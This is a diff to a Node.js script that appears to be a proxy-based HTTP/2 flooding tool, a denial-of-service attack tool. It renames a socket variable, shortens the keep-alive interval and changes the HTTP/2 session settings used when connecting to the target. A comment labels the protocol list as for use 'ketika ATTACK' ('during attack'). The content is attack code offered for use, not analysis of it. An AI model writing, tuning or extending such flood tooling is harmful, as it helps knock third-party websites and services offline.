@@ -100,7 +100,7 @@ const net = require("net");
  }
  }
 
- const Socker = new NetSocket(); // Socket GET Fixed
+ const Socket = new NetSocket(); // Socket GET Fixed
  headers[":method"] = "GET";
  headers[":path"] = parsedTarget.path;
  headers[":scheme"] = "https";
@@ -125,10 +125,10 @@ const net = require("net");
          timeout: 3
      };
 
-     Socker.HTTP(proxyOptions, (connection, error) => {
+     Socket.HTTP(proxyOptions, (connection, error) => {
          if (error) return
  
-         connection.setKeepAlive(true, 10000);
+         connection.setKeepAlive(true, 1000);
 
          const tlsOptions = {
             ALPNProtocols: ['h2', 'http/1.1', 'h3', 'http/2+quic/43', 'http/2+quic/44', 'http/2+quic/45'], // Protocol List ketika ATTACK
@@ -157,23 +157,23 @@ const net = require("net");
          const client = http2.connect(parsedTarget.href, {
              protocol: "https:",
              settings: {
-            headerTableSize: 65536,
-            maxConcurrentStreams: 1000,
-            initialWindowSize: 6291456,
-            maxHeaderListSize: 262144,
+            headerTableSize: 66,
+            maxConcurrentStreams: 10,
+            initialWindowSize: 656,
+            maxHeaderListSize: 24,
             enablePush: false
           },
-             maxSessionMemory: 333,
-             maxDeflateDynamicTableSize: 4294967295,
+             maxSessionMemory: 33,
+             maxDeflateDynamicTableSize: 4295,
              createConnection: () => tlsConn,
              socket: connection,
          });
  
          client.settings({
-            headerTableSize: 65536,
-            maxConcurrentStreams: 1000,
-            initialWindowSize: 6291456,
-            maxHeaderListSize: 262144,
+            headerTableSize: 636,
+            maxConcurrentStreams: 100,
+            initialWindowSize: 6296,
+            maxHeaderListSize: 244,
             enablePush: false
           });
  
